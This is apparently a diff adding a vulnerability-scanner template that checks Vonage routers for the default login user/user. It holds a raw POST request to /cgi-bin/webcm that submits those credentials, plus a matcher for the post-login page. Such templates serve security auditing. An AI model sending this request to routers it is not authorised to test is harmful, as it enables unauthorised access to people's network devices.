@@ -1,0 +1,28 @@
+id: vonage-router-default-password
+info:
+  name: Vonage Router Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Vonage routers have a default username and password (user/user). Attackers can use these credentials to log in to the system, access sensitive operations, and obtain sensitive data.
+  reference:
+    - https://www.vonage.com
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/webcm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww%2Findex.html&var%3Apagename=dhcpc&var%3Aerrorpagename=setup&var%3Amenu=setup&var%3Amenutitle=Setup&var%3Apagetitle=Log+In&var%3Apagemaster=setup&login%3Acommand%2Fusername=user&login%3Acommand%2Fpassword=user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Please select the appropriate option to connect to your ISP."
